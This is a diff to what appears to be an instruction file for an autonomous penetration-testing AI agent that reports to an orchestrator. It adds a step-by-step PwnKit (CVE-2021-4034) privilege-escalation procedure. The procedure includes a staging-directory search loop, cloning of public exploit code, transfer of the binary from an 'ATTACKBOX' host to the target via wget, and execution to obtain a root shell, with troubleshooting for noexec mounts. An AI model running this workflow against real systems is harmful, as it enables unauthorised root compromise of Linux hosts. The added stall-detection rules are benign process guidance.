@@ -440,6 +440,84 @@ execute. The race condition timing works the same over SSH — the `sleep` and
 - `dbus-send` not found → install `dbus` package or check `/usr/bin/gdbus`
   as alternative.
 
+### CVE-2021-4034 (PwnKit) — pkexec Argument Handling
+
+**Affected:** polkit pkexec < 0.120 (present on most Linux distros before Jan 2022).
+
+pkexec mishandles argc=0 invocations, allowing arbitrary code execution as root
+through GCONV_PATH environment variable manipulation. Requires pkexec to have the
+SUID bit set (default on virtually all installations).
+
+**Verification:**
+
+```bash
+# Check pkexec is SUID
+ls -la /usr/bin/pkexec
+# Expected: -rwsr-xr-x root root
+
+# Check polkit version
+dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null
+# Vulnerable: < 0.120 (Debian/Ubuntu), < 0.120 (RHEL/CentOS)
+```
+
+**Exploitation:**
+
+PwnKit requires staging files in a directory where the SUID process can
+execute shared libraries. `/tmp` is often mounted noexec on hardened systems.
+
+```bash
+# Step 1: Find an exec-capable staging directory
+# Try these in order — first writable+exec wins:
+for d in /dev/shm /var/tmp /run/lock "$HOME" /opt; do
+    mount | grep -q "$(df "$d" 2>/dev/null | tail -1 | awk '{print $1}').*noexec" && continue
+    [ -w "$d" ] && echo "[+] $d is writable and exec-capable" && break
+done
+
+# Step 2: Stage exploit in the chosen directory
+cd /dev/shm  # or whichever directory passed
+mkdir -p pwnkit_work && cd pwnkit_work
+```
+
+**Exploit transfer — attackbox-first workflow:**
+
+Public PwnKit exploits:
+- https://github.com/ly4k/PwnKit (self-contained C, static compilation)
+- https://github.com/berdav/CVE-2021-4034 (Makefile-based)
+
+```bash
+# On ATTACKBOX: download and compile static binary
+git clone https://github.com/ly4k/PwnKit /tmp/pwnkit
+cd /tmp/pwnkit && make
+# Or compile static: gcc -static -o pwnkit PwnKit.c
+
+# Transfer to target
+python3 -m http.server 8080 &
+# On TARGET:
+wget http://ATTACKBOX:8080/pwnkit -O /dev/shm/pwnkit_work/pwnkit
+chmod +x /dev/shm/pwnkit_work/pwnkit
+```
+
+```bash
+# Step 3: Execute
+cd /dev/shm/pwnkit_work
+./pwnkit
+# Expected: root shell
+id
+# uid=0(root) gid=0(root)
+```
+
+**If /tmp is noexec:** This is the most common PwnKit failure. The GCONV_PATH
+trick requires the exploit's shared library to be dlopen'd by pkexec (a SUID
+process). SUID processes ignore LD_PRELOAD, so the .so MUST be on an
+exec-capable filesystem. Use /dev/shm, /var/tmp, or a home directory instead.
+Never attempt LD_PRELOAD workarounds — they do not work with SUID binaries and
+risk destabilizing the target.
+
+**If no exec-capable writable directory exists:** PwnKit is blocked. Return to
+orchestrator with assessment: `blocked — no exec-capable staging directory for
+GCONV_PATH .so`. The orchestrator may route to **linux-kernel-exploits** for
+DirtyCow/DirtyPipe or other vectors that don't require shared library loading.
+
 ## Step 5: SUID Binary Exploitation
 
 ### Enumeration
@@ -782,18 +860,28 @@ credentials obtained, current mode.
 
 ## Stall Detection
 
-If you have spent **5 or more tool-calling rounds** troubleshooting the same
-failure with no meaningful progress — same error, no new information gained,
-no change in output — **stop**.
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
 
-Retrying a command with adjusted syntax, different flags, or additional context
-counts as progress. Stalling means repeating the same approach and getting the
-same result.
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
 
 Do not loop. Work through failures systematically:
 1. Try each variant or alternative **once**
 2. Check the Troubleshooting section for known fixes
-3. If nothing changes the outcome after 5 rounds, you are stalled
+3. If nothing works after 5 rounds, you are stalled
 
 **When stalled, return to the orchestrator immediately with:**
 - What was attempted (commands, variants, alternatives tried)
@@ -834,3 +922,10 @@ system-wide. No bypass without kernel exploit.
 ### SUID binary is statically linked
 Cannot use shared object injection or LD_PRELOAD. Focus on argument injection,
 environment variable abuse, or functionality-based exploitation (GTFOBins patterns).
+
+### PwnKit fails with GCONV errors
+The staging directory is likely mounted noexec. Move all PwnKit files to an
+exec-capable directory (/dev/shm, /var/tmp, home directory). Check with:
+`mount | grep "$(df /path 2>/dev/null | tail -1 | awk '{print $1}')"` — if
+the output includes "noexec", that directory won't work. If no exec-capable
+directory is writable, PwnKit is blocked — return to orchestrator.
